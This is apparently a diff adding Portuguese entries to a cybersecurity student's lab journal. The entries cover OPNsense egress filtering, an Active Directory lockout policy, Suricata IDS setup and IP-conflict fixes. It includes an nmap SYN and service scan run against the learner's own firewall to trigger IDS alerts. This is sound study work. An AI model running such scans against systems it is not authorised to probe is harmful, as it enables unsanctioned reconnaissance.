+   - Ao inspecionar a regra de bloqueio em modo de edição, o campo `Source` aparecia como `any`, não `192.168.10.101` — a regra nunca tinha ficado configurada como pedido. Investigação revelou a causa: o campo `Source`/`Destination` do OPNsense funciona como uma caixa de etiquetas (tags) — o valor `any` já vem pré-preenchido como etiqueta antes de se escrever, e escrever um novo valor e premir Enter **adiciona** essa etiqueta ao lado do `any`, em vez de o substituir. Como a etiqueta `any` continuava lá, a regra continuava, na prática, a significar "qualquer origem". A regra de "permitir" tinha o mesmo problema, com `Destination` também preso em `any`.
+5. Apagadas as duas regras mal configuradas e recriadas do zero, desta vez removendo explicitamente a etiqueta `any` (clicando no `×`) antes de gravar cada regra. Confirmado visualmente na lista de regras (colunas `Source`/`Destination`) que ficaram com os valores corretos, antes de aplicar as alterações.
+6. Reteste final: `ping -c 3 192.168.10.254` → sucesso, 0% perda; `ping -c 3 8.8.8.8` → falha, 100% perda.
+
+### Resultado
+Egress filtering confirmado a funcionar: o "Servidor Vulneravel" mantém acesso total à rede do lab, mas fica sem qualquer via de acesso à internet — nem pela rede "Ciber" (bloqueado pela regra), nem por nenhuma rota alternativa (a segunda placa de rede foi removida).
+
+### Deduções e raciocínio
+Esta entrada tem três lições técnicas reais, todas do tipo "o que parece simples na teoria tem armadilhas na prática":
+
+1. **Rotas concorrentes**: uma VM pode ter múltiplas interfaces de rede com rotas por defeito em conflito; regras de firewall só têm efeito no tráfego que realmente passa pela interface onde estão aplicadas — daí a importância de confirmar sempre `ip route` antes de assumir que uma regra "devia" estar a funcionar.
+2. **Estado de firewalls stateful**: vale sempre a pena verificar a tabela de estados (`Diagnostics → States`) como hipótese de diagnóstico, mesmo que neste caso se tenha revelado não ser a causa — é uma ferramenta de descarte útil.
+3. **Armadilhas de interface (UI)**: um campo que parece um simples campo de texto pode na realidade ser uma caixa de etiquetas com um valor pré-existente escondido (`any`), que só desaparece se for explicitamente removido. Isto é uma lição sobre **verificar sempre o resultado final através de uma vista independente** (neste caso, a lista de regras, que mostra o valor real guardado) em vez de confiar apenas no que se pensa ter escrito no formulário de edição.
+
+O achado da segunda placa de rede (Fase 4, NAT do VMware) é também um lembrete de que configurações provisórias (feitas por necessidade temporária, como dar acesso à internet para instalar pacotes) precisam de ser revertidas quando deixam de ser necessárias — de outra forma tornam-se falhas de segurança esquecidas.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "criei duas regras no firewall para que a máquina vulnerável só possa falar com o resto do laboratório, não com a internet; tive de descobrir e corrigir dois problemas escondidos — uma segunda ligação de rede que contornava o firewall, e um campo do formulário que continuava a guardar 'qualquer origem' mesmo depois de eu escrever o IP certo."
+
+### Como nos podemos defender
+Isto É a defesa: egress filtering é uma técnica de segurança real e amplamente usada — limitar não só quem pode entrar numa máquina, mas também para onde essa máquina pode enviar tráfego, reduz o impacto se ela for comprometida (impede exfiltração de dados e contacto com servidores de comando e controlo externos). Lição adicional: nunca confiar cegamente que uma configuração de segurança "ficou aplicada" só porque o formulário foi submetido sem erro — confirmar sempre o efeito real, através de teste funcional.
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — segmentação de rede, egress filtering), Security+ D4 (Operações de Segurança — firewalls stateful, diagnóstico), CEH D2 (Reconhecimento e Scanning — perspetiva do atacante sobre superfícies de saída), NIS2 (medidas técnicas de gestão de risco).
+
+### Próximos passos
+Continuar o hardening do OPNsense (avaliar outras regras, considerar Suricata como IDS) e/ou avançar para a instalação do Wazuh (SIEM/HIDS).
+
+---
+
+## Entrada #73 — Dificuldades de processo da sessão de hoje (Fase 5): um balanço honesto
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server, Windows 11, OPNsense
+
+### Objetivo / Propósito
+Registar, de forma honesta, as dificuldades práticas e de processo desta sessão longa de Fase 5 — não só o que funcionou, mas o que custou tempo e paciência a resolver, seguindo o mesmo princípio já aplicado na Fase 4 (Entradas #57-#65): documentar o real, não uma versão polida.
+
+### Ação executada / dificuldades encontradas
+1. **Teclado sem barra invertida (`\`) a funcionar na VM Windows 11** — impediu escrever credenciais no formato `DOMINIO\utilizador`. Contornado usando o formato alternativo UPN (`utilizador@dominio`), que existe precisamente para estes casos.
+2. **Bug de sincronização do clipboard do VMware** (já referido antes com o Kali) reapareceu de forma intermitente no Windows 11 — colar texto por vezes reintroduzia conteúdo antigo, ou disparava ações erradas fora da janela pretendida (como a caixa "Selecionar uma aplicação para abrir 'Add-Computer'").
+3. **Instabilidade da caixa `Get-Credential` do PowerShell** ao tentar juntar o Windows 11 ao domínio — disparava repetidamente uma ação de sistema fora de contexto, mesmo sem colar nada. Contornado usando o caminho gráfico clássico (`sysdm.cpl`) em vez do comando PowerShell.
+4. **Campo Source/Destination do OPNsense como caixa de etiquetas** — o valor `any` pré-existente não é substituído ao escrever um novo valor, tem de ser removido explicitamente. Isto gerou duas regras de firewall mal configuradas à primeira tentativa, e uma boa parte do tempo desta sessão foi gasta a diagnosticar por que razão regras "aparentemente corretas" não tinham efeito nenhum.
+5. **Fadiga acumulada de repetição gráfica** — ao longo da sessão, a quantidade de passos por interface gráfica (GPMC, OPNsense, System Properties) foi maior do que o habitual neste projeto (que privilegia o terminal), e a soma de pequenos problemas técnicos foi desgastante. Isto é uma dificuldade real e válida de registar, não um sinal de falha — sessões que envolvem muita configuração de sistemas via GUI, em vez de comandos determinísticos, são objetivamente mais sujeitas a este tipo de atrito.
+
+### Resultado
+Apesar das dificuldades, todos os objetivos técnicos planeados para a sessão foram alcançados (AD DS, GPO funcional, egress filtering confirmado) — mas o caminho até lá foi mais longo e mais frustrante do que o necessário, por razões maioritariamente de ferramentas/interface, não de compreensão dos conceitos.
+
+### Deduções e raciocínio
+Vale a pena reter, para sessões futuras: quando o trabalho envolve várias interfaces gráficas empilhadas (GPMC dentro do Windows Server, formulários do OPNsense, caixas de diálogo do Windows), a probabilidade de pequenas falhas de interface acumuladas sobe consideravelmente — e a paciência é um recurso finito que se gasta mais depressa nesse tipo de sessão do que numa sessão de comandos de terminal, onde o feedback é mais direto e menos ambíguo. Não é falta de capacidade técnica; é simplesmente um tipo de trabalho mais desgastante.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "hoje grande parte do tempo não foi gasto a aprender conceitos novos, mas a lutar contra problemas de interface e de ambiente (teclado, clipboard, formulários enganadores) — o que é frustrante, mas também é uma parte real e honesta do trabalho técnico do dia a dia, que vale a pena documentar em vez de esconder."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo. Lição de processo transversal: confirmar sempre o resultado final através de uma vista independente (a lista, não o formulário de edição) é uma prática que teria poupado tempo em pelo menos dois destes casos.
+
+### Domínios relacionados
+Não aplicável a domínios técnicos de certificação — esta entrada é sobre processo e metodologia de trabalho, não sobre conteúdo de segurança.
+
+### Próximos passos
+Nenhum específico — esta entrada é só o balanço honesto do dia, tal como já foi feito na Fase 4.
+
+---
+
+## Entrada #74 — Política de bloqueio de conta (Account Lockout Policy) configurada e testada com sucesso: fecho do bloco de Active Directory
+**Data/hora:** 2026-08-24
+**Máquinas ligadas:** Windows Server, Windows 11
+
+### Objetivo / Propósito
+Fechar o bloco de Active Directory da Fase 5 com uma medida de defesa concreta, ligando diretamente à Fase 2 (força bruta contra logins do DVWA): configurar uma política de bloqueio de conta ao nível do domínio, e confirmar na prática que bloqueia tentativas repetidas de login falhado.
+
+### Ação executada
+1. Editada a `Default Domain Policy` (a política aplicada por defeito a todo o domínio, sem necessidade de criar uma nova GPO), via `gpmc.msc` → `Computer Configuration` → `Policies` → `Windows Settings` → `Security Settings` → `Account Policies` → `Account Lockout Policy`.
+2. Definidos três valores: `Account lockout threshold` = 5 tentativas falhadas; `Account lockout duration` = 30 minutos; `Reset account lockout counter after` = 30 minutos (os dois últimos preenchidos automaticamente pelo Windows como sugestão ao definir o primeiro).
+3. Confirmado com `Get-GPO -Name "Default Domain Policy"` que o `ComputerVersion` subiu (de um valor anterior para `13`), confirmando a gravação.
+4. Teste prático a partir do Windows 11: login com a conta `LAB\uteste` e password propositadamente errada, repetido várias vezes. As primeiras tentativas mostraram o erro normal de credenciais inválidas; a partir de determinado ponto, o Windows 11 começou a mostrar "Credenciais inválidas, a atrasar a próxima tentativa..." — uma proteção própria do cliente Windows (limitação de tentativas rápidas), distinta da política de domínio.
+5. Confirmação definitiva feita do lado do Windows Server (não do cliente): `Get-ADUser -Identity uteste -Properties LockedOut` → `LockedOut : True`.
+
+### Resultado
+Política de bloqueio de conta configurada e confirmada a funcionar de facto — a conta `uteste` ficou bloqueada no Active Directory depois de várias tentativas de login falhadas, tal como definido.
+
+### Deduções e raciocínio
+Vale a pena distinguir dois mecanismos de defesa diferentes que apareceram ao mesmo tempo neste teste: a mensagem "a atrasar a próxima tentativa" no Windows 11 é uma proteção do próprio sistema operativo cliente (introduzida em versões recentes do Windows para atrasar tentativas rápidas de login, independentemente de haver ou não Active Directory envolvido); o bloqueio real e confirmado (`LockedOut: True`) é a política de domínio que configurámos, e é essa que teria impedido de facto um ataque de força bruta como o praticado na Fase 2. É um bom exemplo de como a mesma situação pode ter várias camadas de defesa sobrepostas, cada uma com origem e âmbito diferentes — e por isso a confirmação definitiva foi sempre procurada na fonte de verdade (o Active Directory), não no sintoma visível no ecrã do cliente.
+
+Com esta entrada, o bloco de Active Directory da Fase 5 fica considerado concluído: domínio criado, DNS e OUs organizadas, utilizador de teste, GPO de aviso de login funcional, e agora política de bloqueio de conta testada.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "configurei uma regra no domínio que bloqueia automaticamente uma conta depois de 5 tentativas de login erradas, e confirmei que funciona mesmo, tentando entrar de propósito com a password errada várias vezes até a conta ficar mesmo bloqueada."
+
+### Como nos podemos defender
+Esta É a defesa: uma política de bloqueio de conta é uma das medidas mais diretas e eficazes contra ataques de força bruta e password spraying — sem ela, um atacante pode tentar milhares de passwords sem consequência; com ela, cada conta fica automaticamente protegida ao fim de poucas tentativas. É também a razão pela qual o valor escolhido (5 tentativas) é um equilíbrio comum entre segurança e usabilidade (um limite demasiado baixo causa bloqueios acidentais frequentes por erros de digitação legítimos).
+
+### Domínios relacionados
+Security+ D3 (Arquitetura de Segurança — políticas de conta), Security+ D4 (Operações — resposta a tentativas de acesso não autorizado), CEH D3 (System Hacking — defesas contra força bruta), ligação direta à Fase 2 (Entradas de força bruta contra o DVWA).
+
+### Próximos passos
+Desbloquear a conta `uteste` (boa prática de administração) e avançar para o segundo bloco pendente da Fase 5: continuar o hardening do OPNsense e/ou iniciar o Wazuh (SIEM/HIDS).
+
+---
+
+## Entrada #75 — Ativação do Suricata (IDS) no OPNsense: dificuldades reais no processo, antes do resultado final
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** OPNsense, Kali Linux (como posto de gestão via browser)
+
+### Objetivo / Propósito
+Continuar o hardening do OPNsense começado na sessão anterior, desta vez introduzindo deteção de intrusão (IDS) através do Suricata, já integrado no sistema base do OPNsense 25.1 (deixou de ser um plugin à parte). Esta entrada documenta, de forma honesta, o processo de tentativa e erro até se conseguir descarregar as regras de deteção — nada disto foi direto à primeira.
+
+### Ação executada / dificuldades encontradas
+1. **Confusão inicial sobre onde encontrar o Suricata** — a expectativa era instalá-lo como plugin (`os-suricata`) em `Firmware → Plugins`, mas não aparecia na lista alfabética onde devia estar. Correção: nas versões recentes do OPNsense, o Suricata já vem incluído no sistema base, acessível diretamente em `Services → Intrusion Detection`.
+2. **Configuração inicial (Enabled, Interfaces=LAN, IPS mode desligado) marcada mas nunca guardada** — a página `Settings` tinha as caixas certas marcadas visualmente, mas sem clicar em `Save`/`Apply` no fundo da página, nada ficou realmente ativo. Isto só foi percebido ao voltar à página mais tarde e ver tudo desmarcado outra vez.
+3. **Botão "Download & Update Rules" a falhar silenciosamente** — ao clicar, a página mostrava uma animação de carregamento por 1-2 segundos e voltava ao estado inicial, sem qualquer mensagem de erro. Isto repetiu-se em várias tentativas.
+4. **Hipótese testada e descartada: falta de internet no OPNsense** — chegou a suspeitar-se (com razão, dada a experiência da sessão anterior com o segundo NIC da "Servidor Vulneravel") que o próprio OPNsense tinha perdido acesso à internet. Verificação nas definições da VM (VMware) confirmou que a VM do OPNsense tinha mesmo apenas um adaptador de rede (LAN Segment), sem NAT/WAN — situação diferente da "Servidor Vulneravel", mas com o mesmo tipo de causa (uma placa de rede em falta a nível de VMware).
+5. **Correção do adaptador em falta** — foi necessário desligar a VM do OPNsense por completo (o VMware recusa adicionar placas de rede a uma VM ligada, por falta de "slots" para hot-plug), adicionar um novo Network Adapter em modo NAT, e voltar a ligar a VM. Confirmado no ecrã de arranque: `WAN (em1) -> v4/DHCP4: 192.168.203.130/24`.
+6. **Confirmação de conectividade a partir da consola** — `ping 8.8.8.8` (sucesso, 100%) e `ping google.com` (sucesso, resolve e responde) confirmaram rede e DNS a funcionar. No entanto, `ping rules.emergingthreats.net` deu 100% de perda — inicialmente ambíguo (pode ser DNS a falhar ou o servidor a bloquear ICMP).
+7. **Log File do Suricata revelou a pista real** — mesmo depois de corrigir o adaptador e guardar as definições, o log mostrava repetidamente `[100599] <Warning> -- 1 rule files specified, but no rules were loaded!`, confirmando que o serviço estava mesmo a correr, mas o ficheiro de regras nunca tinha sido descarregado com sucesso pela GUI.
+8. **Diagnóstico decisivo por linha de comandos** — em vez de continuar a confiar num botão da GUI que falhava em silêncio, usou-se a Shell da consola do OPNsense (opção 8) com `fetch -o /dev/null https://rules.emergingthreats.net/open/suricata-7.0.3/emerging.rules.tar.gz`. Este comando teve sucesso imediato (5458 kB em ~1 segundo), confirmando definitivamente que a rede, o DNS e o HTTPS funcionam bem — o problema está isolado ao mecanismo de download da GUI, não à ligação.
+9. **Erro de digitação notado antes de premir Enter** — o comando `fetch` foi escrito manualmente (sem copy/paste possível na consola), e continha inicialmente `emerging.rules.tar.gaz` em vez de `.tar.gz`; foi identificado e corrigido antes de correr.
+
+### Resultado
+Ainda em curso — a rede e o acesso do OPNsense à internet estão confirmados a funcionar (via CLI). Falta ainda usar o comando equivalente do OPNsense (`configctl ids update`) para tentar reproduzir o mesmo sucesso pelo caminho "oficial" e perceber se o botão da GUI tinha mesmo um problema à parte, ou se as regras ficam agora corretamente carregadas.
+
+### Deduções e raciocínio
+Esta sequência de dificuldades ilustra bem um padrão que já vinha da sessão anterior: falhas silenciosas em interfaces gráficas (sem mensagem de erro) são muito mais difíceis de diagnosticar do que falhas em terminal, onde o resultado é imediato e explícito. O comando `fetch` por CLI resolveu em segundos uma dúvida que a GUI deixou em aberto durante várias tentativas. Também fica confirmado, pela segunda vez nesta Fase 5, que VMs podem perder adaptadores de rede de forma não intencional (desta vez no próprio OPNsense, não numa VM cliente) — vale a pena, de futuro, verificar sempre as definições de hardware da VM em VMware como primeiro passo de diagnóstico de rede, antes de assumir problemas de configuração dentro do sistema operativo.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "o OPNsense já vem com um IDS (Suricata) incluído, mas para descarregar as regras que ele usa para detetar ataques, o botão da interface gráfica falhava sem explicar porquê. Verificámos passo a passo — internet, DNS, adaptador de rede da própria firewall — e só quando testámos por linha de comandos é que confirmámos que a ligação estava bem e o problema era mesmo só daquele botão específico."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — esta entrada é sobre diagnóstico de infraestrutura, não sobre uma técnica de ataque. Boa prática geral: quando uma ação pela interface gráfica falha sem mensagem de erro, testar o mesmo objetivo por linha de comandos costuma revelar informação que a GUI esconde.
+
+### Domínios relacionados
+Não aplicável diretamente a domínios de certificação — esta entrada é sobre processo de diagnóstico de rede e infraestrutura de laboratório.
+
+### Próximos passos
+Correr `configctl ids update` na Shell do OPNsense e confirmar se as regras ficam corretamente carregadas (via Log File e via separador Rules). Depois, gerar tráfego de teste a partir do Kali (por exemplo, um scan nmap) para confirmar que o Suricata gera alertas reais.
+
+---
+
+## Entrada #76 — Causa raiz encontrada e Suricata (IDS) ativado com sucesso: 1160 regras carregadas
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** OPNsense, Kali Linux (SSH e browser)
+
+### Objetivo / Propósito
+Fechar a investigação iniciada na Entrada #75: encontrar a razão pela qual o OPNsense nunca conseguia carregar as regras do Suricata (nem pela GUI, nem pelo comando `configctl ids update`), e confirmar a ativação final do IDS.
+
+### Ação executada / dificuldades encontradas
+1. **Ativação do SSH no OPNsense** para continuar a investigação sem os problemas de teclado da consola local (símbolos como `|` e `\` mal mapeados nesse teclado específico, diferente do problema já visto no Windows 11). Duas dificuldades extra no processo: a opção "Permit password login" também estava desligada por defeito (o SSH só aceitava chave, negando a password), e o "Permit root user login" também teve de ser ativado explicitamente — ambos em `System → Settings → Administration → Secure Shell`.
+2. **Confirmação da causa raiz via `config.xml`** — usando `grep -n "IDS" /conf/config.xml` e depois `sed -n` para ver a secção completa, confirmou-se que `<fileTags/>` estava vazio, ou seja, a seleção de rulesets nunca tinha sido gravada em nenhuma das tentativas anteriores (nem a manual, nem a "tudo numa sequência sem sair da página").
+3. **Descoberta do passo em falta** — na página `Download`, as checkboxes de cada ruleset servem apenas para *selecionar* linhas; é necessário depois clicar no botão **"Enable selected"** (no topo da tabela) para essa seleção passar a "ativa" de facto (o que atualiza o `fileTags` na configuração). Este passo nunca tinha sido usado nas tentativas anteriores — íamos direto das checkboxes para "Download & Update Rules", que sozinho não tem nenhum ruleset ativo para descarregar.
+4. **Confusão momentânea ao usar "Enable selected"** — depois de clicar, as checkboxes ficam automaticamente desmarcadas outra vez, o que pareceu inicialmente que nada tinha acontecido; a confirmação real está na coluna "Enabled" (que passa de X para visto), não no estado da checkbox de seleção.
+
+### Resultado
+Sucesso confirmado por várias vias independentes: o Log File deixou de mostrar "no rules were loaded" e passou a mostrar avisos sobre regras específicas reais (ex.: flowbit da sig 2035004); e o separador `Rules` mostra agora **1160 regras carregadas** (rulesets ET open/scan e ET open/attack-response), todas com Action "alert" e Enabled ativo.
+
+### Deduções e raciocínio
+A causa final não foi nenhuma das hipóteses mais "técnicas" que fomos testando por ordem (falta de internet, DNS, disco cheio, ficheiro de regras em falta) — essas eram todas hipóteses válidas de descartar sistematicamente, mas a causa real era um passo de interface subtil e fácil de saltar sem dar por isso. Isto reforça uma lição já vista nesta Fase 5 com o OPNsense (a armadilha da tag "any" no firewall): interfaces gráficas com passos de duas etapas (selecionar + confirmar/ativar) são uma fonte comum de erros silenciosos, porque a primeira etapa (marcar a checkbox) parece suficiente mas não é.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "para ativar regras no Suricata do OPNsense não basta marcar as caixas dos rulesets que queremos — é preciso depois clicar num botão separado ('Enable selected') para essa seleção ficar mesmo gravada. Sem isso, o botão de download corre sem ter nada para descarregar, e falha em silêncio sem explicar porquê."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é uma lição de usabilidade/processo. Boa prática geral: depois de qualquer ação de configuração em duas etapas (selecionar + aplicar), confirmar sempre o resultado numa vista independente (aqui, a coluna "Enabled" da tabela, ou o `config.xml` diretamente) em vez de assumir que a primeira etapa foi suficiente.
+
+### Domínios relacionados
+Introdução a conceitos de IDS/IPS (deteção de intrusão baseada em assinaturas) — relevante para Security+ e CEH, no domínio de deteção e monitorização de rede.
+
+### Próximos passos
+Gerar tráfego de teste a partir do Kali (nmap scan contra o Servidor Vulneravel ou outra VM do lab) para confirmar que o Suricata gera alertas reais visíveis no separador Alerts.
+
+---
+
+## Entrada #77 — Suricata confirmado a detetar tráfego real: teste com nmap e descoberta do IP dinâmico do Kali
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** OPNsense, Kali Linux
+
+### Objetivo / Propósito
+Gerar tráfego real de teste para confirmar que o Suricata (ativado na Entrada #76) deteta e regista alertas, fechando o ciclo de ativação do IDS nesta sessão.
+
+### Ação executada / dificuldades encontradas
+1. **Primeira tentativa: `nmap -sS -A 192.168.10.101` (Kali → Servidor Vulneravel)** — não gerou nenhum alerta (`Alerts` mostrava "no results found"), apesar de o scan ter corrido normalmente e de haver 1160 regras ativas.
+2. **Diagnóstico do porquê** — o Kali e o Servidor Vulneravel estão no mesmo segmento de rede (LAN Segment "Ciber", 192.168.10.0/24), ligados ao mesmo switch virtual. Tráfego entre duas máquinas na mesma sub-rede não passa pelo OPNsense (não há routing envolvido), por isso o Suricata, que está a monitorizar a interface LAN do OPNsense, nunca chega a ver esse tráfego. É o mesmo princípio de um switch físico: só entrega tráfego unicast à porta de destino, não copia para todas as portas.
+3. **Segunda tentativa, corrigida: `nmap -sS -A 192.168.10.254` (Kali → OPNsense diretamente)** — como o OPNsense é sempre o destino final deste tráfego, este chega mesmo à sua interface LAN e é inspecionado.
+4. **Descoberta inesperada durante o scan**: o IP de origem registado nos alertas era `192.168.10.102`, não o IP fixo `192.168.10.10` que o Kali deveria ter segundo a topologia documentada do projeto. Confirmado com o utilizador que é sempre a mesma VM Kali original (não uma segunda VM) — o IP fixo deixou de estar configurado dentro da VM nalgum momento, e agora recebe IP por DHCP (correspondendo ao lease "vbox" já visto antes na lista do OPNsense). Fica como item pendente para corrigir numa sessão futura, sem urgência.
+
+### Resultado
+Sucesso — o separador `Alerts` do Suricata mostrou vários alertas reais gerados pelo scan: múltiplas entradas `ET SCAN Possible ...` (SID 2024364) e uma `ET ATTACK_RESPONSE FTP inaccessible directory access COM1`, todos com Interface `LAN`, Source `192.168.10.102` (Kali) e Destination `192.168.10.254` (OPNsense), em pelo menos duas páginas de resultados.
+
+### Deduções e raciocínio
+Esta entrada fecha com um conceito de rede fundamental, complementar ao que já tínhamos aprendido sobre routing na Fase 4/5: um IDS colocado "no router" só vê tráfego que atravessa esse router — tráfego lateral dentro da mesma sub-rede (entre duas VMs no mesmo switch) fica invisível a esse IDS. Isto é exatamente a razão pela qual, em redes empresariais reais, um IDS de rede é normalmente ligado a uma porta de espelho (SPAN/mirror) de um switch gerido, ou colocado num ponto onde o tráfego relevante seja forçado a passar por ele (por exemplo, entre sub-redes/VLANs diferentes) — caso contrário, teria "pontos cegos" enormes.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "um IDS ligado só à interface de um router não vê tráfego entre duas máquinas que estão na mesma rede local, porque esse tráfego nunca passa pelo router — só é encaminhado (routed) tráfego que muda de sub-rede. Para testar o IDS, tive de apontar o scan diretamente ao próprio router, porque aí o tráfego é obrigatoriamente visto por ele."
+
+### Como nos podemos defender
+Ligado ao conceito de defesa em profundidade: um único IDS de rede posicionado no gateway não é suficiente para detetar ataques laterais (entre máquinas da mesma rede interna) — só cobre tráfego que entra/sai da rede ou que atravessa o router. Para deteção de movimento lateral, seria necessário um IDS por segmento, uma porta de espelho no switch, ou um HIDS (deteção baseada no próprio host) — que é precisamente o que o Wazuh, o próximo bloco desta Fase 5, vai trazer.
+
+### Domínios relacionados
+IDS/IPS de rede, arquitetura de deteção, limitações de visibilidade em redes comutadas (switching vs. routing) — relevante para Security+ e CEH.
+
+### Próximos passos
+Corrigir o IP fixo do Kali (192.168.10.10) numa sessão futura, sem urgência. Continuar o restante hardening do OPNsense e/ou avançar para o bloco Wazuh (HIDS), que complementaria exatamente a limitação de visibilidade lateral identificada nesta entrada.
+
+---
+
+## Entrada #78 — Correção do IP fixo do Kali (192.168.10.10), resolvendo a discrepância encontrada na Entrada #77
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** Kali Linux
+
+### Objetivo / Propósito
+Corrigir a discrepância identificada na Entrada #77: o Kali estava a receber IP por DHCP (192.168.10.102) em vez de usar o IP fixo 192.168.10.10 definido na topologia do projeto.
+
+### Ação executada / dificuldades encontradas
+1. **Diagnóstico** — `ip a` revelou que a interface `eth0` tinha *dois* endereços IPv4 simultâneos: `192.168.1.50/24` (estático, sem a etiqueta "dynamic" — resquício de uma configuração antiga da rede de casa) e `192.168.10.102/24` (com a etiqueta "dynamic", atribuído por DHCP na rede do lab). O `nmcli device status` confirmou que o NetworkManager não gere esta interface ("não gerenciável"), pelo que a configuração vinha do ficheiro clássico `/etc/network/interfaces`.
+2. **Correção** — editado `/etc/network/interfaces` (via `sudo nano`), substituindo o bloco estático antigo (`address 192.168.1.50`, `gateway 192.168.1.241`, `dns-nameservers 8.8.8.8`) pelos valores corretos da rede do lab: `address 192.168.10.10`, `netmask 255.255.255.0`, `gateway 192.168.10.254`, `dns-nameservers 192.168.10.254`.
+3. **Aplicação** — `sudo systemctl restart networking` para recarregar a configuração sem reiniciar a VM.
+
+### Resultado
+Sucesso confirmado: `ip a` mostra agora apenas `192.168.10.10/24` na interface `eth0` (sem o endereço antigo nem o dinâmico), e `ping -c 3 192.168.10.254` teve 0% de perda. A topologia do lab está de novo alinhada com o documentado (Kali = 192.168.10.10 fixo).
+
+### Deduções e raciocínio
+A causa provável desta deriva: nalgum momento anterior o `/etc/network/interfaces` deve ter sido reposto ou nunca atualizado desde uma configuração de casa mais antiga, enquanto outro mecanismo (possivelmente o próprio processo de arranque a pedir DHCP como reserva) atribuiu um segundo endereço à mesma interface. Ter duas configurações de IP ativas na mesma interface é uma fonte silenciosa de comportamento inconsistente — vale a pena, de futuro, verificar `ip a` no Kali no início de cada sessão que dependa do seu IP fixo, tal como já se verifica a rede antes de outros exercícios.
+
+### Consigo explicar isto a alguém?
+Sim — por palavras próprias: "a interface de rede do Kali tinha uma configuração estática desatualizada (da rede de casa) e ainda por cima estava a receber um segundo IP por DHCP ao mesmo tempo — corrigi o ficheiro de configuração para usar só o IP fixo correto do lab e reiniciei o serviço de rede."
+
+### Como nos podemos defender
+Não aplicável no sentido ofensivo/defensivo — é uma correção de configuração de ambiente de laboratório.
+
+### Domínios relacionados
+Configuração de rede em Linux (IP estático vs. DHCP) — fundamentos relevantes para A+ Core1 e Security+.
+
+### Próximos passos
+Continuar o restante da Fase 5: alargar o egress filtering do OPNsense a mais VMs e/ou iniciar o bloco Wazuh (SIEM/HIDS).
+
+## Entrada #79 — Conflito de IP descoberto e corrigido (Windows Server / Kali), e reforço com reservas estáticas DHCP
+**Data/hora:** 2026-08-25
+**Máquinas ligadas:** Windows Server, Windows 11, Ubuntu Desktop, OPNsense (via browser no Kali)
+
+### Objetivo / Propósito
+Antes de alargar o egress filtering do OPNsense a mais VMs (próximo passo da Fase 5), confirmar o IP atual de cada máquina-alvo (Windows Server, Windows 11, Ubuntu Desktop) — a lista de DHCP Leases não mostrava nenhuma entrada ativa para as duas primeiras.
+
+### Ação executada / dificuldades encontradas
+1. **Windows 11** — `ipconfig` revelou IP 192.168.10.100 (correspondia à lease "expired" vista antes; o Windows continuava a usá-lo mesmo sem renovação formal). Foi também visível um adaptador extra "cliente-wg" com IP 10.10.10.2, sem gateway — identificado como a interface virtual do túnel WireGuard, confirmando que o VPN já estava configurado numa fase anterior do projeto.
+2. **Windows Server** — `ipconfig` revelou IP **192.168.10.10** — o mesmo IP fixo atribuído ao Kali na Entrada #78. Conflito de IP real entre duas VMs distintas. O campo Default Gateway estava também em branco.
+3. **Diagnóstico** — `Get-NetIPAddress -InterfaceAlias "Ethernet0" -AddressFamily IPv4` confirmou `PrefixOrigin`/`SuffixOrigin: Manual`, ou seja, uma configuração estática definida manualmente (não vinda de DHCP). A origem é conhecida e está documentada: foi na Entrada #66 que o Windows Server recebeu o IP fixo 192.168.10.10 — na altura sem se reparar que esse é o endereço reservado ao Kali na topologia do projeto. O conflito só se tornou visível agora, quando o IP do Kali foi reposto para 192.168.10.10 na Entrada #78.
+4. **Correção (PowerShell no Windows Server)** — `Remove-NetIPAddress`, seguido de `New-NetIPAddress -IPAddress 192.168.10.1 -PrefixLength 24 -DefaultGateway 192.168.10.254`, e `Set-DnsClientServerAddress -ServerAddresses 192.168.10.254`. O IP 192.168.10.1 foi escolhido por já constar como valor planeado na topologia original do projeto (e por se ter confirmado, entretanto, que não estava em uso por ninguém).
+5. **Dificuldade à parte** — ao pedir confirmação do resultado, colou-se acidentalmente o bloco de texto inteiro da resposta anterior (incluindo os prompts `PS C:\Users\Administrator>`) de volta para dentro da consola real, em vez de apenas o comando pedido. Isto gerou uma cascata de erros, porque o PowerShell interpretou `PS` como o alias de `Get-Process`. Não houve impacto real — foi só "ruído" — mas serviu de lembrete para copiar sempre só a linha de comando, nunca o bloco com os prompts incluídos.
+6. **Verificação** — o novo IP ficou em estado `AddressState: Preferred` (ou seja, a deteção de duplicados via ARP não encontrou mais ninguém a usar 192.168.10.1), e `ping 192.168.10.254` teve 0% de perda.
+7. **Ubuntu Desktop** — `ip a` confirmou IP 192.168.10.20/24 (dinâmico) e revelou também uma interface `wg0` com IP 10.10.10.1/24 — o servidor WireGuard, complementando a descoberta do "cliente-wg" no Windows 11.
+8. **Reforço com reservas estáticas DHCP** — no OPNsense (`Services → ISC DHCPv4 → Leases`), criada uma reserva estática para o Windows 11 (IP 192.168.10.100, MAC 00:0c:29:7c:50:c6 pré-preenchido automaticamente a partir da lease) via o botão "Add static mapping", seguido de "Apply changes". O Ubuntu Desktop já tinha uma reserva estática pré-existente (visível pelo estado "static" na lista de leases), pelo que não precisou de alteração.
+
+### Resultado
+As três VMs-alvo do próximo passo (extensão do egress filtering) têm agora IP fixo e estável, confirmado diretamente (não apenas assumido pela topologia documentada):
+- Windows Server: 192.168.10.1 (estático, configurado na própria VM)
+- Windows 11: 192.168.10.100 (reserva estática DHCP, criada agora)
+- Ubuntu Desktop: 192.168.10.20 (reserva estática DHCP, já existente)
+
+### Deduções e raciocínio
